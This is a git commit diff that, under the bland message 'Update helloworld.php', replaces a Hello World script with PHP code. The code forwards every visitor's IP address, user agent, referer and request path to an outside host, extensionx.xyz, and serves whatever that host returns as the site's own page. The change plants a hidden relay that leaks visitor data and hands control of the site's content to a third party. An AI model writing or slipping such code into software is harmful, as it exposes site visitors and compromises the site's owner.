c04f472b9d81dafc82fc8380da7fe439a57ce8df
themonsterx <themonster@mit.tc>
2018-03-21 10:21:35 +0300

    Update helloworld.php

--- helloworld.php
+++ helloworld.php
@@ -1,2 +1,25 @@
 <?php
-  echo 'Hello, World!';
+	$ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+	$browser = @$_SERVER['HTTP_USER_AGENT'];
+	$request = @$_SERVER['REQUEST_URI'];
+	$referer = @$_SERVER['HTTP_REFERER'];
+	$app = explode('.', @$_SERVER['HTTP_HOST'])[0];
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "http://$app.extensionx.xyz$request");
+	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+		"X-Forwarded-for: $ip",
+		"User-Agent: $browser",
+		"Referer: $referer",
+		"Site:".@$_SERVER['HTTP_HOST'],
+		"Via: Compression"
+    ));
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	$response = curl_exec($ch);
+	$info = curl_getinfo($ch);
+	curl_close($ch);
+	@ob_end_clean();
+    @ob_end_flush();
+	header('Content-Type:'.$info['content_type']);
+	header('HTTP/1.1 '.$info['http_code']);
+	echo $response;
+?>
